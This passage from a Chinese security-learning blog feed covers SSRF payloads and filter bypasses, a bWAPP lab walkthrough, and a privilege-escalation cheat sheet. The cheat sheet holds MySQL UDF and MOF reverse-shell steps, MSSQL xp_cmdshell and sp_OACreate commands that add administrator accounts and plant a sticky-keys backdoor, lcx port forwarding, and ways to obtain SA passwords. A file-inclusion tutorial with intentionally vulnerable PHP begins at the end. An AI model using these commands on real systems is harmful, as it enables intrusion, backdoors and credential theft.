punctuation">,</span><span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span><span class="token variable">$URL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span><span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">curl</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>file_get_contents造成的SSRF</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h5 id="SSRF常见出现位置"><a href="#SSRF常见出现位置" class="headerlink" title="SSRF常见出现位置"></a>SSRF常见出现位置</h5><ul><li>分享：通过URL地址分享网页内容</li><li>转码服务</li><li>在线翻译</li><li>图片加载与下载：通过URL地址加载或下载图片</li><li>图片、文章收藏功能</li><li>未公开API实现以及其他调用URL的功能</li></ul><h5 id="SSRF验证方法"><a href="#SSRF验证方法" class="headerlink" title="SSRF验证方法"></a>SSRF验证方法</h5><p>1.因为SSRF漏洞是构造服务器发送请求的安全漏洞，所以我们就可以通过抓包分析发送的请求是否是由服务器的发送的来判断是否存在SSRF漏洞</p><p>2.在页面源码中查找访问的资源地址 ，如果该资源地址类型为 <a href="http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞" target="_blank" rel="noopener">http://www.xxx.com/a.php?image=（地址）的就可能存在SSRF漏洞</a></p><h5 id="利用SSRF漏洞"><a href="#利用SSRF漏洞" class="headerlink" title="利用SSRF漏洞"></a>利用SSRF漏洞</h5><ol><li>让服务器去访问相应的网址</li><li>让服务器去访问自己所处内网的一些指纹文件来判断是否存在相应的CMS</li><li>可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</li></ol><ul><li><p>file协议</p><p>​    查看文件：file:///etc/passwd</p></li><li><p>dict协议</p><p>​    探测端口：dict://127.0.0.1:80</p></li><li><p>gopher协议</p><p>​    Gopher协议可以做很多，特别是在SSRF漏洞中可以发挥很多重要的作用，利用此协议可以攻击内网的FTP、Telnet Redis Memcache 也可以进行GET POST请求 .</p></li></ul><ol><li>攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包）</li><li>攻击内网应用程序（利用跨协议通信技术）</li><li>DOS攻击</li><li>判断内网主机是否存活：访问是否有端口开放</li></ol><h5 id="常见的绕过方法"><a href="#常见的绕过方法" class="headerlink" title="常见的绕过方法"></a>常见的绕过方法</h5><ul><li><p>@绕过：<code>http://xxx.com@10.10.10.10=10.10.10.10</code></p></li><li><p>利用特殊的域名</p></li><li><p>利用句号</p><p>127。0。0。1=&gt;127.0.0.1</p></li><li><p>利用协议</p></li><li><p>利用Enclosed </p></li><li><p>IP使用其他进制：127.0.0.1=2130706433</p></li><li><p>使用短地址：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a> ==<a href="https://dwz.lc/2fGYWaE" target="_blank" rel="noopener">https://dwz.lc/2fGYWaE</a></p></li></ul><h5 id=""><a href="#" class="headerlink" title=""></a><img src="QQ%E6%88%AA%E5%9B%BE20200212110340.png" alt=""></h5><h4 id="bWAPP靶场实战（SSRF"><a href="#bWAPP靶场实战（SSRF" class="headerlink" title="bWAPP靶场实战（SSRF)"></a>bWAPP靶场实战（SSRF)</h4><h5 id="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"><a href="#一、使用（RFI）远程文件包含进行端口扫描（内网探测）" class="headerlink" title="一、使用（RFI）远程文件包含进行端口扫描（内网探测）"></a>一、使用（RFI）远程文件包含进行端口扫描（内网探测）</h5><p>我们进入bWAPP  SSRF部分。</p><img src="QQ截图20200128162933.png" style="zoom:50%;" /><p>我们点击黑体字Port scan得到了端口扫描的攻击脚本</p><img src="QQ截图20200128163234.png" style="zoom:50%;" /><p>我们退出SSRF模块 进入（RFI/LFI)模块，发现?language=lang_en.php此处可能存在文件包含漏洞。</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128163521.png" alt=""></p><p>我们在VM中开启了虚拟机，得知IP为192.168.153.131</p><img src="QQ截图20200128164256.png" style="zoom:50%;" /><h5 id="二、使用XXE获取敏感文件中的内容"><a href="#二、使用XXE获取敏感文件中的内容" class="headerlink" title="二、使用XXE获取敏感文件中的内容"></a>二、使用XXE获取敏感文件中的内容</h5><p>我们先点击黑体字获取XXE攻击脚本。</p><img src="QQ截图20200128170206.png" style="zoom:67%;" /><p><img src="QQ%E6%88%AA%E5%9B%BE20200128170255.png" alt=""></p><p> 然后使用Burp抓包后发送到Repeater模块，</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128171953.png" alt=""></p><p> 第一次我们使用http协议读取robots.txt文件内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175808.png" alt=""></p><p>第二次我们使用php协议读取 xml页面中的内容</p><p><img src="QQ%E6%88%AA%E5%9B%BE20200128175940.png" alt=""></p><p>第三次我们使用file协议读取本机的/etc/passwd的内容</p><img src="QQ截图20200128180043.png" style="zoom:67%;" />]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>提权方式总结</title>
      <link href="/2020/04/03/ti-quan-fang-shi-zong-jie/"/>
      <url>/2020/04/03/ti-quan-fang-shi-zong-jie/</url>
      
        <content type="html"><![CDATA[<h2 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a>提权方式总结</h2><h4 id="1-什么是提权"><a href="#1-什么是提权" class="headerlink" title="1.什么是提权"></a>1.什么是提权</h4><p>提权就是通过各种办法和漏洞，提高自己在服务器中的权限，以便控制全局。</p><p>Windows：User &gt;&gt; System<br>Linux：User &gt;&gt; Root</p><h4 id="2-提权的方式"><a href="#2-提权的方式" class="headerlink" title="2.提权的方式"></a>2.提权的方式</h4><p>1.、系统漏洞提权（Linux、Windows）</p><p>2、数据库提权</p><p>3、系统配置错误提权</p><p>4、权限继承类提权</p><p>5、第三方软件/服务提权</p><p>6、WebServer漏洞提权</p><h4 id="1-系统漏洞提权"><a href="#1-系统漏洞提权" class="headerlink" title="1.系统漏洞提权"></a>1.系统漏洞提权</h4><p>系统漏洞提权一般就是利用系统自身缺陷，用来提升权限。为了使用方便，windows和linux系统均有提权用的可执行文件。</p><p>Windows的提权exp一般格式为MS08067.exe；<br>Linux的提权exp一般格式为2.6.18-194或2.6.18.c。</p><h5 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h5><ul><li>漏洞编号命名格式</li></ul><p>Windows系统漏洞编号命名格式为：MS08067</p><p>其中：MS是Micosoft的缩写，固定格式；08 表示年份，即2008年发布的漏洞；067 表示顺序，即当年度发布的第67个漏洞。</p><ul><li>使用exp提权</li></ul><p>在日常渗透测试过程中，我们常常会先是拿到webshell再进行提权。所以提权脚本也常常会被在webshell中运行使用。</p><p>那么我们如何知道使用哪个exp来提权呢？</p><p>我们可以使用systeminfo命令或者查看补丁目录，查看补丁记录，来判断有哪个补丁没打，然后使用相对应的exp进行提权。</p><p><strong>TIPS：</strong></p><p>1.渗透过程中经常会遇到管理员禁止了cmd.exe的使用，我们该怎么办？进止了exe文件的上传怎么办？<br> 2.管理员禁止了一些脚本函数的运行，看不到回显怎么办？<br> 3.在使用webshell提权的时候要特别注意：<br> asp的webshell要支持：<br> wscript(wscript.shell/shell.application)<br> aspx能调用.net组件来执行cmd的命令<br> /c whoami</p><h5 id="linux系统提权"><a href="#linux系统提权" class="headerlink" title="linux系统提权"></a>linux系统提权</h5><p>Linux系统漏洞的exp一般按照内核版本来命名：2.6.18-194或2.6.18.c</p><p>形如2.6.18-194，可以直接执行；形如2.6.18.c，需要编译后运行，提权。当然也有少部分exp是按照发行版版本命名。</p><p>使用exp</p><p>一般情况下linux的本地提权要用nc反弹出来，因为Linux下提升权限后得到的是交互式shell，需反弹才能进行下一步命令的执行。<br>我们可以使用uname -a命令或者cat /proc/version，来判断系统的内核情况等等，然后使用相对应的exp进行提权。<br>注：</p><p>提权过程中需要为你的提权exp赋权，chmod。<br>linux服务器很多情况下管理员会设置目录权限，我们无法修改，但是一般/tmp/目录不会被设置权限，这和windows下的tmp和回收站是一个道理，所以我们可以将exp存放到/tmp目录下。</p><h4 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h4><p>数据库提权是指：通过执行数据库语句、数据库函数等方式提升服务器用户的权限。</p><p>首先我们要先有能力登入数据库，所以通常我们拿到webshell之后要去网站目录去找数据库连接文件，常在形如xxx.conf或conf.xxx文件中。</p><h5 id="MySQL数据库提权"><a href="#MySQL数据库提权" class="headerlink" title="MySQL数据库提权"></a>MySQL数据库提权</h5><p>MySQL数据库一般是使用udf（用户自定义函数）提权或mof（托管对象格式）提权。</p><ul><li>udf提权（用户自定义函数）</li></ul><p><strong>条件：</strong><br>1、系统版本（Windows2000，XP,Win2003)；<br>2、拥有MYSQL的某个账号，且该账号具有对msql的insert与delete权限；<br>3、具有root账号密码。</p><p><strong>使用方法：</strong><br>1、获取当前mysql的一个数据库连接信息，通常包含地址、端口、账号、密码、库名等五个信息。<br>2、把udf专用的webshell传到服务器上，访问并进行数据库连接。<br>3、连接成功后，导出DLL文件。</p><p><strong>注：</strong></p><ul><li>Mysql&lt;5.0，导出路径随意;</li><li>5.0&lt;=mysql&lt;5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“No paths allowed for shared library”错误；</li><li>mysql&gt;5.1，需要导出dll到插件路径，例如：D:\Program Files\MySQL\MySQL Server 5.1.3\lib\plugin<br>若mysql&gt;=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。</li><li>如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：drop function cmdshell;</li></ul><p><strong>使用SQL语句创建自定义函数。语法如下：</strong></p><p><code>Create Function 函数名 returns string soname &#39;导出的DLL路径&#39;;eg: Create Function cmdshell returns string soname &#39;udf.dll&#39;;</code></p><p><strong>功能函数说明：</strong></p><ul><li>cmdshell 执行cmd;</li><li>downloader 下载者,到网上下载指定文件并保存到指定目录;</li><li>open3389 通用开3389终端服务,可指定端口(不改端口无需重启);</li><li>backshell 反弹Shell;</li><li>ProcessView 枚举系统进程;</li><li>KillProcess 终止指定进程;</li><li>regread 读注册表;</li><li>regwrite 写注册表;</li><li>shut 关机,注销,重启;</li><li>about 说明与帮助函数;</li></ul><p><strong>创建函数成功后，就可以通过sql语句调用它了。</strong></p><p>语法如下：<br>select 创建的函数名 (‘参数列表’);<br>eg: select cmdshell(“net user nsfocus Nsf0cus /add”)；创建一个用户nsfocus，密码为Nsf0cus</p><p><strong>函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。</strong></p><p>删除函数的语法如下：<br>drop function 创建的函数名;<br>eg: drop function cmdshell;</p><h5 id="整体思路："><a href="#整体思路：" class="headerlink" title="整体思路："></a>整体思路：</h5><ul><li>导出C:\windows\udf.dll</li><li>Create Function cmdshell returns string soname ‘udf.dll’;</li><li>select cmdshell(‘whoami’)</li><li>drop function cmdshell</li></ul><h5 id="Mof提权（托管对象格式）"><a href="#Mof提权（托管对象格式）" class="headerlink" title="Mof提权（托管对象格式）"></a>Mof提权（托管对象格式）</h5><p>提权c:/windows/system32/wbem/mof/</p><pre><code>- use exploit/windows/mysql/mysql_mof- set password xxx- set username xxx- set rhost xxx- set rport xxx- set payload windows/shell_reverse_tcp- set lhost xxx- set lport xxx- exploit</code></pre><h5 id="Mssql数据库提权"><a href="#Mssql数据库提权" class="headerlink" title="Mssql数据库提权"></a>Mssql数据库提权</h5><p><img src="https://img-blog.csdnimg.cn/20190611101318911.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4Njg0NTA0,size_16,color_FFFFFF,t_70" alt="img"></p><p><strong>在SA权限下</strong></p><p>1.存在xp_cmdshell时<br>使用xp_cmdshell执行命令添加用户，当出现错误可以恢复和开启xp_cmdshell</p><p>2.xp_cmdshell无法使用时<br>    使用sp_OACreate执行命令，同样当出现错误可以恢复和开启</p><ol start="3"><li><p>当执行命令无法使用时可以用沙盒提权 (使用xp_regwrite和openrowset)</p></li><li><p>当只有xp_regwrite可用时可以劫持粘滞键（sethc.exe)<br>使用xp_regwrite修改注册表</p></li></ol><p><strong>DBA权限下</strong></p><ol><li>备份到网站目录</li><li>通过备份文件到启动项提权</li></ol><h5 id="SA口令获取方法"><a href="#SA口令获取方法" class="headerlink" title="SA口令获取方法"></a>SA口令获取方法</h5><ul><li><strong>Webshell或源码获取</strong></li></ul><p>一般在网站的配置文件中有存放明文账号密码，常用配置文件名如：</p><pre><code>conn.aspxconfig.aspxconfig.phpweb.config.........一般格式如：server=localhost;UID=sa;PWD=shadowflow</code></pre><ul><li><strong>源代码泄露</strong></li></ul><p>网站源码泄露情况主要以程序员上传代码到git等开源平台或更新代码时未删除备份文件(.svn、.git、.bak），以及运维人员打包源代码到网站服务器(<a href="http://www.rar/" target="_blank" rel="noopener">www.rar</a>等）。</p><ul><li><strong>嗅探</strong></li></ul><p>在局域网中使用cain等工具进行arp嗅探的时候可以抓取到1433端口的数据库明文登录密码</p><ul><li><strong>口令暴力破解</strong></li></ul><p>利用mssql暴力破解工具对mssql进行暴力破解，一旦成功将获得sa相应权限</p><p><strong>常用SQL Server提权语句</strong></p><pre><code>查看数据库版本：select @@version查看数据库系统参数：exec master..xp_msver;查看用户所属角色信息：sp_helpsrvrolemember查看当前数据库：select db_name()显示机器上的驱动器：xp_availablemedia查看当前账户权限select IS_SRVROLEMEMBER(&#39;sysadmin&#39;) #判断是否为sa权限类似serveradmin,setupadmin,securityadmin,diskadmin,bulkadminselect IS_MEMBER(&#39;db_owner&#39;) #判断是否为dbo权限添加用户exec master.dbo.sp_addlogin test,password #添加用户exec master.dbo.sp_addsrvrolemember test,sysadmin #加权限启动停止服务exec master..xp_servicecontrol &#39;stop&#39;,&#39;test&#39;exec master..xp_servicecontrol &#39;start&#39;,&#39;test&#39;检查功能SELECT count(*）FROM master.dbo.sysobjects WHERE name=&#39;xp_cmdshell&#39;xp_cmdshell, xpregread,sp_makewebtask,xp_subdirs,xp_dirtree, sp_addextendedproc</code></pre><p><strong>xp_cmdshell</strong></p><pre><code>1、开启xp_cmdshell存储过程exec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec sp_configure &#39;xp_cmdshell&#39;,1;RECONFIGURE;2、关闭xp_cmdshell存储过程exec sp_configure &#39;show advanced options&#39;, 1, RECONFIGURE;exec sp_configure &#39;xp_cmdshell&#39;,0;RECONFIGURE;3、xp_cmdshell执行命令exec master..xp_cmdshell &#39;ver&#39;exec master.dbo.xp_cmdshell &#39;net localgroup administrators test /add&#39;4、恢复xp_cmdshellexec sp_dropextendedproc &#39;xp_cmdshell&#39;dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;xplog70.dll) OR dbcc addextendedproc (&quot;xp_cmdshell&quot;,&quot;d:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll&quot;);EXEC sp_configure &#39;show advanced options&#39;, 0 --</code></pre><p><strong>sp_OACreate</strong></p><pre><code>1、开启sp_OACreateexec sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;exec sp_configure &#39;Ola Automation Procedures&#39; , 1;RECONFIGURE;2、关闭sp_OACreateexec sp_configure &#39;show advanced options&#39;,1;RECONFIGURE;exec sp_configure &#39;Ole Automation Procedures&#39;,0;RECONFIGURE;3、禁用advanced optionsEXEC sp_configure &#39;show advanced options&#39;,0;GO RECONFIGURE;4、sp_OACreate执行命令DECLARE @js intEXEC sp_OACreate &#39;ScriptControl&#39;,@js OUTEXEC sp_OASetProperty @js,&#39;Language&#39;,&#39;JavaScript&#39;ActiveXObject(&quot;Shell.Users&quot;);z=o.create(&quot;user&quot;);z.changePassword(&quot;pass&quot;,&quot;&quot;);z.setting(&quot;AccountType&quot;)=3;&#39;5、sp_OACreate移动文件declare @aa intexec sp_oacreate &#39;scripting.filesystemobject&#39; @aa outexec sp_oamethod @aa, &#39;moveFile&#39;,null,&#39;c:\temp\ipmi.log&#39;,&#39;c:\temp\ipmi1.log&#39;;6、sp_OACreate复制文件declare @o intexec sp_oacreate &#39;scripting.filesystemobject&#39;, @o outexec sp_oamethod @o,&#39;copyfile&#39;,null,&#39;c:\windows\explorer.exe&#39;,&#39;c:\windows\system32\sethc.exe&#39;;7、sp_OACreate删除文件DECLARE @Result intDECLARE @FSO_Token intEXEC @Result = sp_OACreate &#39;Scripting.FileSystemObject&#39;, @FSO_Token OUTPUTEXEC @Result = sp_OAMethod @FSO_Token, &#39;DeleteFile&#39;,NULL,&#39;c:\Documents and Settings\All Users\ [开始] 菜单\程序\启动\user.bat&#39;EXEC @Result = sp_OADestrop @FSO_Token8、wscript.shell执行命令9、Shell.Application执行命令10、sp_oacreate 替换粘贴键</code></pre><p><strong>沙盒执行命令</strong></p><p>openrowset开启</p><p>openrowset关闭</p><p>沙盒执行命令</p><p><strong>注册表篡改</strong></p><p>注册表劫持粘贴键</p><h4 id="系统配置不当提权"><a href="#系统配置不当提权" class="headerlink" title="系统配置不当提权"></a>系统配置不当提权</h4><p>利用配置不当提权</p><ul><li>前提：已经成功渗透进目标系统；</li><li>相比利用漏洞提权，是更常用的方法；</li><li>在大部分企业中，会将系统的漏洞即时进行补丁更新，难以通过系统自身我的漏洞进行入侵；</li><li>可以查找系统中以system权限启动的服务或应用，可以尝试将其替换或者反弹shell的方式提权；</li><li>可以查找NTFS权限允许users修改删除的应用，利用配置不当进行提权；</li><li>代码中是否有过滤参数的操作等都可以加以利用，进行提取</li></ul><h4 id="权限继承类提权"><a href="#权限继承类提权" class="headerlink" title="权限继承类提权"></a>权限继承类提权</h4><p><strong>开机启动项提权？</strong><br>windows开机时候都会有一些开机启动的程序，那时候启动的程序权限都是system，因为是system把他们启动的，利用这点，我们可以将自动化脚本写入启动项，达到提权的目的。</p><h4 id="第三方软件-服务提权"><a href="#第三方软件-服务提权" class="headerlink" title="第三方软件/服务提权"></a>第三方软件/服务提权</h4><h4 id="WebServer漏洞提权"><a href="#WebServer漏洞提权" class="headerlink" title="WebServer漏洞提权"></a>WebServer漏洞提权</h4><h4 id="提权中常见的问题"><a href="#提权中常见的问题" class="headerlink" title="提权中常见的问题"></a>提权中常见的问题</h4><p>cmd无法执行</p><ul><li><p>cmd被删除</p><ul><li>绕过思路：找可读可写目录，上传cmd.exe</li></ul></li><li><p>cmd被降权</p><ul><li>绕过思路：找可读可写目录，上传cmd.exe</li></ul></li><li><p>组件被删除</p><ul><li>切换组件</li></ul></li><li><p>防护软件拦截</p><ul><li>很难绕过</li></ul></li><li><p>3389无法连接</p></li><li><p>端口被修改</p><ul><li>找端口（1-65535），使用端口扫描工具、注册表读取、查询PID</li></ul></li><li><p>端口被关闭</p><ul><li>上传3389打开工具到可读可写目录，需要先提权，调用执行exe工具</li></ul></li><li><p>内网环境</p><ul><li>端口转发：<ol><li>外网服务器：lcx.exe -listen 1234 4321 (监听1234端口的流量并将其转发至本地4321端口)</li><li>内网肉鸡：lcx.exe -slave 121.43.99.73 1234 192.168.1.106 1111 (将本地192.168.1.106的1111端口流量转发至121.43.99.73的1234端口上)</li><li>外网 连接本地端口4321 即代表连接肉鸡的1111端口</li></ol></li></ul></li><li><p>防护软件拦截</p><ul><li>很困难</li></ul></li></ul><h3 id="提权辅助工具"><a href="#提权辅助工具" class="headerlink" title="提权辅助工具"></a>提权辅助工具</h3><h5 id="1-Linux提权辅助工具"><a href="#1-Linux提权辅助工具" class="headerlink" title="1.Linux提权辅助工具"></a>1.Linux提权辅助工具</h5><p>Linux_Exploit_Suggester是一款根据操作系统版本号自动查找相应提权脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p><p>github项目地址：</p><pre><code>https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</code></pre><p> 用法示例：</p><pre><code>$ perl ./Linux_Exploit_Suggester.pl -k 2.6.28</code></pre><h5 id="2-Windows提权辅助工具"><a href="#2-Windows提权辅助工具" class="headerlink" title="2.Windows提权辅助工具"></a>2.Windows提权辅助工具</h5><p>Windows-Exploit-Suggester是受Linux_Exploit_Suggester的启发而开发的一款提权辅助工具，用python开发而成，通过比对systeminfo生成的文件，从而发现系统是否存在未修复漏洞。</p><p>github项目地址：</p><pre><code>https://github.com/AonCyberLabs/Windows-Exploit-Suggester</code></pre><p>用法示例：</p><pre><code>#查看系统可能存在的漏洞$ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt $ ./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --ostext &#39;windows server 2008 r2&#39;</code></pre><h5 id="3-gfto"><a href="#3-gfto" class="headerlink" title="3.gfto"></a>3.gfto</h5><p>gtfo是一个纯粹用python3编写的工具，用于搜索GTFOBins和LOLBAS上的二进制文件。</p><p>github项目地址： </p><pre><code>https://github.com/mzfr/gtfo</code></pre><p>很明显，从以上描述里，我们知道这款工具并不是主角，需要重点关注的是GTFOBins和LOLBAS。</p><p>GTFOBins：Linux命令提权辅助查询.</p><h5 id="4-Beroot"><a href="#4-Beroot" class="headerlink" title="4.Beroot"></a>4.Beroot</h5><p>BeRoot Project是一个利用后的工具，可以检查常见的错误配置，以找到提升我们特权的方法，该项目可在Windows，Linux和Mac OS上运行。</p><p>github项目地址：</p><pre><code>https://github.com/AlessandroZ/BeRoot</code></pre><h5 id="5-Vulmap"><a href="#5-Vulmap" class="headerlink" title="5.Vulmap"></a>5.Vulmap</h5><p>Vulmap是一个开源的在线本地漏洞扫描程序项目。它由适用于Windows和Linux操作系统的联机本地漏洞扫描程序组成。</p><p>Github项目地址：</p><pre><code>https://github.com/vulmon/Vulmap</code></pre><h5 id="6-WindowsVulnScan"><a href="#6-WindowsVulnScan" class="headerlink" title="6.WindowsVulnScan"></a>6.WindowsVulnScan</h5><p>这是一款基于主机的漏洞扫描工具，查看查找主机上具有的CVE和具有公开EXP的CVE。</p><p>github项目地址：</p><pre><code>https://github.com/chroblert/WindowsVulnScan</code></pre><h5 id="7、ATRoot-Auxiliary-v2-0"><a href="#7、ATRoot-Auxiliary-v2-0" class="headerlink" title="7、ATRoot Auxiliary v2.0"></a>7、ATRoot Auxiliary v2.0</h5><p>基于java开发的提权辅助工具，支持双端加载，本地模式配置文件存放于本地软件目录下的conf目录；远程模式则可以更新配置文件</p><h5 id="8、在线提权漏洞检测平台"><a href="#8、在线提权漏洞检测平台" class="headerlink" title="8、在线提权漏洞检测平台"></a>8、在线提权漏洞检测平台</h5><p>一款为主流 Linux/Unix 和 Windows 系统提供精准且高效的操作系统脆弱性漏洞检测的专业化平台，基于其强大的安全检测能力，能够给出专业的修复建议，有效验证和加固网络资产漏洞。</p><p>在线查询地址：</p><pre><code>https://detect.secwx.com/</code></pre><h5 id="9-提权辅助网页"><a href="#9-提权辅助网页" class="headerlink" title="9.提权辅助网页"></a>9.提权辅助网页</h5><p>在Windows提权的时候，对比补丁找Exp很烦吧？老是忘记一些提权命令跟工具的语法很苦逼吧？没事，有了这款工具什么问题都解决~</p><p>在线查询地址：</p><pre><code>http://bugs.hacking8.com/tiquan/</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞学习笔记</title>
      <link href="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/"/>
      <url>/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h2 id="文件包含漏洞学习"><a href="#文件包含漏洞学习" class="headerlink" title="文件包含漏洞学习"></a>文件包含漏洞学习</h2><h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><ul><li>require()</li><li>require_once()</li><li>include()</li><li>include_once()</li></ul><p><strong><code>include</code>和<code>require</code>区别</strong>:<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p><p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p><p><img src="D:%5C%E5%9B%BE%E7%89%87%5C9272355-7889a572371b18c8.png" alt=""></p><h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p><p>示例代码：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>       <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p><h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件包含分为：本地(LFI)/远程(RFI)包含</p><p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p><p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p><pre class=" language-undefined"><code class="language-undefined">allow_url_fopen = Onallow_url_include = On，重启apache，即可生效</code></pre><p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p><pre class=" language-kotlin"><code class="language-kotlin">apt<span class="token operator">-</span><span class="token keyword">get</span> install apache2 <span class="token operator">/</span>etc<span class="token operator">/</span><span class="token keyword">init</span><span class="token punctuation">.</span>d<span class="token operator">/</span>apache2 start</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/9272355-952116d80dc7f768.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1200" alt="img"></p><p>1.png</p><p><img src="https://upload-images.jianshu.io/upload_images/9272355-e288840e08e52b5e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/376" alt="img"></p><p>2.png<br> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token variable">$file</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>allow_url_fopen 默认为 On<br> allow_url_include 默认为 Off<br> 若有特殊要求，会在利用条件里指出。</p><h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><h5 id="一、无限制本地文件包含漏洞"><a href="#一、无限制本地文件包含漏洞" class="headerlink" title="一、无限制本地文件包含漏洞"></a>一、无限制本地文件包含漏洞</h5><p><strong>测试代码：</strong></p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token variable">$filename</span> <span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token 